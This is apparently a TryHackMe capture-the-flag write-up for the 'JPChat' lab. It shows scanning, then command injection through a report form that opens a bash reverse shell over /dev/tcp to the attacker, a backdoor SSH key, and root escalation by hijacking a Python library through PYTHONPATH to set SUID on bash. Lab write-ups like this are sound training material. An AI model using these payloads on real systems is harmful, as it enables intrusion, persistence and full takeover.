---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - RCE
  - Sudo
  - Lib-HJ
---
https://tryhackme.com/room/jpgchat/
# IPs
- **Target's IP**: `10.66.128.142`
- **Attacker's IP**: `192.168.186.238`
# Scanning
```console
$ nmap -p22,3000 -sV -sC 10.66.128.142

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
|_  256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=12/14%Time=693F6A4D%P=x86_64-pc-linux-gnu%r(N
SF:ULL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x2
SF:0service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSA
SF:GE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(current
SF:ly\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x2
SF:0report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Ge
SF:nericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20
SF:this\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github
SF:\nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(
SF:currently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x
SF:20to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n
SF:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
There is a GitHub Point-to-Point Protocol (PPP) service at point 3000. We will see what is it:
```console
$ nc 10.66.128.142 3000

Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```
Testing the messaging tool:
```console
[MESSAGE]
There are currently 0 other users logged in
[MESSAGE]: hello
[MESSAGE]:
```
Found user `Mozzie-jpg` in the report tool:
```console
[REPORT]
this report will be read by Mozzie-jpg
your name:
bob
your report:
test
```
By doing some Google searches, found the source code in a [GitHub repository](https://github.com/Mozzie-jpg/JPChat):
```python
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```
As we can see from the source code, both `your_name` and `report_text` parameters are vulnerable to code injection.
# Exploitation
Listen for connections:
```bash
nc -lvnp 4444
```
Get reverse shell connection:
```console
$ nc 10.66.128.142 3000

Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg
your name:
bob; bash -i >& /dev/tcp/192.168.186.238/4444 0>&1
your report:

bob
```
# Post-Exploitation
## Functional Shell
The current connection is very nonfunctional, since no output is seeing from commands:
```console
wes@ubuntu-xenial:/$ whoami

whoami
```
Since SSH is active, we will create a key pair and share it via Python:
```console
$ mkdir -p ~/.ssh

$ ssh-keygen -t rsa -f ~/.ssh/id_rsa_backdoor -N "" && cat ~/.ssh/id_rsa_backdoor.pub >> ~/.ssh/authorized_keys

$ cd ~/.ssh

$ python3 -m http.server 8000
```
Download the private key and re-connect via SSH:
```console
$ curl -s -O http://10.66.128.142:8000/id_rsa_backdoor

$ chmod 600 id_rsa_backdoor

$ ssh wes@10.66.128.142 -i id_rsa_backdoor
```
Get the **user flag**:
```bash
cat /home/wes/user.txt
```
## Privilege Escalation
We can run a Python script using `sudo`:
```console
$ sudo -l

Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
Take a look at the script `/opt/development/test_module.py`:
```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```
Since we can keep **PYTHONPATH**, we do a [Python library hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/):
```console
$ echo 'import os; os.system("chmod u+s /bin/bash")' > /tmp/compare.py

$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/development/test_module.py

$ /bin/bash -p
```
Get the **root flag**:
```bash
cat /root/root.txt
```